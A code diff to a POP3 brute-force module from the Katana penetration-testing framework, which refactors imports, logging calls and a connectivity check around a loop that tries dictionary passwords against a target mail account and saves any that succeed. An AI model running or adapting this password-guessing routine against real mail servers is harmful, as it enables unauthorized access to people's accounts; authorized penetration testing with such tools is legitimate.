@@ -3,7 +3,7 @@
 
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Katana Core import                  #
-from core.KATANAFRAMEWORK import *    #
+from core.KatanaFramework import *    #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 
 # LIBRARIES
@@ -17,7 +17,7 @@ def init():
 	init.Description        ="Brute Force to POP protocol."
 	init.CodeName           ="btf/pr.pop"
 	init.DateCreation       ="22/03/2015"      
-	init.LastModification   ="21/09/2016"
+	init.LastModification   ="27/12/2016"
 	init.References         =None
 	init.License            =KTF_LINCENSE
 	init.var                ={}
@@ -35,7 +35,7 @@ def init():
 
 # CODE MODULE    ############################################################################################
 def main(run):
-	isLive(init.var['target'],init.var['port'])
+	NET.CheckConnectionHost(init.var['target'],init.var['port'],5)
 	Loadingfile(init.var['dict'])
 
 	pop = poplib.POP3(init.var['target'],int(init.var['port'])) 
@@ -47,11 +47,11 @@ def main(run):
 				pop.user(init.var['user'])
 				pop.pass_(password)
 				if True:
-					printAlert(3,"Successfully with ["+init.var['user']+"]["+password+"]\n")
+					printk.suff("Successfully with ["+init.var['user']+"]["+password+"]\n")
 					Space()
 					saveRegister(init,password)
 					return
 					
-			except:printAlert(0," | Checking '"+password+"'")
+			except:printk.inf(" | Checking '"+password+"'")
 
 # END CODE MODULE ############################################################################################
